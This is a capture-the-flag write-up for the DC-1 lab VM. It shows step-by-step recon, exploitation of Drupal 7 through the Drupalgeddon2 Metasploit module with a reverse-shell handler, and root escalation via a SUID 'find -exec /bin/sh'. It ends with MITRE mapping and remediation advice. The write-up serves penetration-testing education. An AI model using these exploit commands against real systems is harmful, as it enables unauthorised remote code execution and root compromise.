# DC: 1 — Writeup

> The DC series is a collection of purpose-built CTF VMs designed by DCAU (David Corrigan) for learning and practicing real-world penetration testing techniques. DC-1 is where it all kicks off: a vulnerable Drupal 7 installation just begging to get rekt. One CVE, a SUID binary, and five flags standing between you and bragging rights. Let's get it, dude.

---

## Target Information

| Field | Details |
|-------|---------|
| **Level** | Beginner |
| **Target VM** | DC: 1 (VirtualBox/VMware, host-only) |
| **Attacker VM** | Kali Linux 2024.x |
| **Target IP** | 192.168.1.104 (host-only adapter) |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-1-1,292/ |
| **Techniques** | Network recon, CMS fingerprinting, Metasploit exploitation, SUID privesc |
| **CVEs** | CVE-2018-7600 (Drupalgeddon2) |
| **CISA KEV** | Yes, CVE-2018-7600 is catalogued in CISA Known Exploited Vulnerabilities |
| **APT Groups** | Opportunistic threat actors; CVE-2018-7600 leveraged in crypto-mining campaigns and initial access operations by multiple groups |

---

## Attack Summary

```
[Attacker]
    |
    +--[ netdiscover / nmap ]--> 192.168.1.104:80 (Drupal 7)
    |
    +--[ CVE-2018-7600 Drupalgeddon2 (Metasploit) ]--> Meterpreter shell (www-data)
    |
    +--[ find / -perm -u=s ]--> SUID `find` binary discovered
    |
    +--[ find -exec /bin/sh ]--> root shell
    |
    +--[ cat /root/thefinalflag.txt ]--> FLAG CAPTURED
```

---

## Methodology

1. Network discovery and service enumeration
2. Identify Drupal 7 on port 80, confirm CVE-2018-7600 applicability
3. Exploit Drupalgeddon2 via Metasploit, obtain Meterpreter
4. Enumerate SUID binaries from the web shell
5. Abuse SUID `find` to spawn a root shell
6. Collect all five flags

---

## Step 1: Network Discovery

**Context:** Before touching anything, map the network. `netdiscover` finds live hosts on the host-only segment; nmap confirms open services and versions. No assumptions, fr fr.

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
```

```bash
nmap -sV -sC -p- 192.168.1.104
```

**Expected output:**

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
```

**Alternative:** `masscan -p1-65535 192.168.1.104 --rate=1000` for a faster port sweep when stealth is not a concern.

**Real-world note:** Attackers routinely run passive and active network scans during initial access reconnaissance. In a real engagement, this phase would be performed from a VPS or redirector to avoid attribution.

**MITRE TTP:** T1046 - Network Service Discovery

![Nmap scan](images/01-nmap.png)

---

## Step 2: Identify Drupal 7 and Confirm Vulnerability

**Context:** Browsing to port 80 reveals a Drupal 7 site. Drupal 7 before 7.58 is affected by CVE-2018-7600, a critical unauthenticated RCE in the Form API. This is as legit as it gets, dude: no auth, direct code execution.

```bash
curl -s http://192.168.1.104/CHANGELOG.txt | head -5
```

**Expected output:**

```
Drupal 7.x, 2017-xx-xx
```

**Alternative:** Use `droopescan` or check `/admin/reports/status` for version disclosure.

```bash
droopescan scan drupal -u http://192.168.1.104
```

**Real-world note:** CMS version disclosure via `CHANGELOG.txt` and `README.txt` is still extremely common in production environments. Threat actors routinely fingerprint targets with automated scanners before deploying purpose-built exploits.

**MITRE TTP:** T1190 - Exploit Public-Facing Application; T1518.001 - Software Discovery: Security Software Discovery

![Drupal site](images/02-drupal-site.png)

---

## Step 3: Exploit Drupalgeddon2 (CVE-2018-7600) via Metasploit

**Context:** CVE-2018-7600 affects Drupal's Form API. A specially crafted POST request to a Drupal form endpoint allows unauthenticated remote code execution. Metasploit has a stable module for this. Nailed it with like three commands. Noice.

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.1.104
set LHOST <your-attacker-IP>
run
```

**Expected output:**

```
[*] Started reverse TCP handler on <attacker>:4444
[*] Sending stage (39927 bytes) to 192.168.1.104
[*] Meterpreter session 1 opened
meterpreter >
```

Drop into a shell and stabilize it:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Alternative (manual exploit):** Use the standalone PoC from [CVE-2018-7600 GitHub](https://github.com/dreadlocked/Drupalgeddon2):

```bash
python drupalgeddon2.py http://192.168.1.104/
```

**Real-world note:** CVE-2018-7600 is listed in the CISA Known Exploited Vulnerabilities catalog, meaning CISA has evidence of active exploitation in the wild. Real-world incidents from 2018 onwards documented mass exploitation by crypto-mining botnets and APT-aligned groups. Any unpatched Drupal 7 instance exposed to the internet is a sitting duck.

**MITRE TTP:** T1190 - Exploit Public-Facing Application; T1059.004 - Command and Scripting Interpreter: Unix Shell

![Meterpreter shell obtained](images/03-metasploit-shell.png)

---

## Step 4: Enumerate Flags and SUID Binaries

**Context:** DC-1 hides five flags across the filesystem. While hunting for flags, enumerate SUID binaries as part of standard post-exploitation. The `find` binary having SUID set is a classic misconfiguration that turns a file-search utility into a root shell. Bruh.

```bash
# Hunt flags
find / -name "*flag*" 2>/dev/null
cat /etc/flag1.txt
cat /var/www/sites/default/settings.php | grep flag
find / -name "flag*" -type f 2>/dev/null

# Enumerate SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

**Expected SUID output (relevant line):**

```
/usr/bin/find
```

**Real-world note:** SUID bit misconfiguration is in the top-10 of Linux privilege escalation vectors in real penetration tests. It commonly appears after software installations that set SUID unnecessarily or after administrators manually set permissions without understanding the security implications.

**MITRE TTP:** T1083 - File and Directory Discovery; T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid

![SUID find discovered](images/04-suid-privesc.png)

---

## Step 5: Privilege Escalation via SUID `find`

**Context:** Because `find` is SUID root, the `-exec` flag runs commands as root. Classic GTFOBin. Verify execution first, then spawn a root shell. GG.

```bash
# Verify we run as root
touch /tmp/pwn
find /tmp/pwn -exec whoami \;
```

**Expected output:**

```
root
```

```bash
# Spawn root shell
find /tmp/pwn -exec /bin/sh \;
```

Inside the root shell:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/thefinalflag.txt
```

**Alternative:** Use `find -exec /bin/bash -p \;` for a bash root shell with `-p` preserving effective UID.

**Real-world note:** SUID abuse is mapped to ATT&CK as T1548.001 and appears in real incident reports from multiple sectors. Tools like LinPEAS, LinEnum, and pspy automate SUID enumeration and are regularly found in post-breach forensics of compromised Linux hosts.

**MITRE TTP:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid; T1005 - Data from Local System

![Root flag](images/05-root-flag.png)

---

## Captured Flags and Credentials

| Item | Value / Location |
|------|-----------------|
| Flag 1 | `/etc/flag1.txt` |
| Flag 2 | `sites/default/settings.php` (embedded in Drupal config) |
| Flag 3 | `/var/www/sites/default/files/flag3.php` or similar |
| Flag 4 | `/home/flag4/flag4.txt` |
| Final Flag | `/root/thefinalflag.txt` |
| Web server user | `www-data` |
| Root access | Via SUID `find` |

---

## Lessons Learned with Real-World Relevance

1. **CVE-2018-7600 (Drupalgeddon2) is CISA KEV.** This is not a theoretical vulnerability: CISA's Known Exploited Vulnerabilities catalog lists it because it has been actively exploited in production environments. Running an unpatched Drupal 7 in 2024 is negligence, not just a misconfiguration.

2. **SUID on `find` is a single command away from root.** Any developer or sysadmin who sets SUID on a binary listed in GTFOBins effectively grants any local user root access. The fix is trivial; the oversight is inexcusable.

3. **Metasploit is not cheating.** Real threat actors use automated frameworks. Defenders need to understand what automated exploitation looks like in network traffic and system logs to detect it.

4. **CMS version disclosure accelerates exploitation.** `CHANGELOG.txt` existing publicly on a Drupal site tells attackers exactly which CVEs to try. Version disclosure should be treated as a risk to be mitigated, not ignored.

5. **Post-exploitation enumeration should be systematic.** Flags aside, the real lesson is the workflow: shell, stabilize, enumerate users/SUID/sudo/crons/writable dirs. That pattern transfers directly to real engagements.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Notes |
|--------|-----------|-----|-------|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | nmap/droopescan against Drupal |
| Initial Access | Exploit Public-Facing Application | T1190 | CVE-2018-7600 Drupalgeddon2 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Meterpreter shell + python pty |
| Discovery | File and Directory Discovery | T1083 | Flag hunting, SUID enumeration |
| Discovery | Network Service Discovery | T1046 | nmap full port scan |
| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | T1548.001 | SUID `find` -exec |
| Collection | Data from Local System | T1005 | Reading flag files |

---

## Remediation

### Vulnerability: CVE-2018-7600 (Drupalgeddon2)

**NIST CSF 2.0 Functions:** Identify (ID.RA-1), Protect (PR.PS-2), Respond (RS.AN-5)

**NIST SP 800-53 Controls:**
- SI-2: Flaw Remediation (upgrade Drupal to 7.58+)
- CM-7: Least Functionality (disable or restrict `update.php` path)
- RA-5: Vulnerability Monitoring and Scanning

**CISA KEV:** CVE-2018-7600 is catalogued; federal agencies are required to remediate by CISA BOD 22-01 deadlines. All organizations should treat it as critical.

**C2M2:** MIL1 - Establish patch management practices; MIL2 - Monitor vulnerability disclosures for deployed software.

**D3FEND:** D3-SFA (Software Feature Analysis) to detect vulnerable component versions; D3-NTF (Network Traffic Filtering) to block exploit attempts at perimeter.

---

### Vulnerability: SUID `find` misconfiguration

**NIST SP 800-53 Controls:**
- AC-6: Least Privilege (remove SUID bit from non-essential binaries)
- CM-6: Configuration Settings (enforce secure baseline; audit SUID/SGID binaries)
- SI-7: Software, Firmware, and Information Integrity

**Remediation command:**

```bash
chmod u-s /usr/bin/find
```

**D3FEND:** D3-HBPI (Hardware-Based Process Isolation); D3-EAL (Executable Allowlisting) to prevent unauthorized SUID execution paths.

---

## Final Thoughts

DC-1 is the perfect entry point for the series. CVE-2018-7600 is a textbook example of why patch management is not optional: one unpatched CMS on a perimeter host and you are handing threat actors unauthenticated RCE. The SUID `find` misconfiguration reinforces the principle of least privilege in the most direct way possible. If you made it through DC-1, you have the foundation. The series only gets more interesting from here.

Thanks guys!! (❍ᴥ❍ʋ)
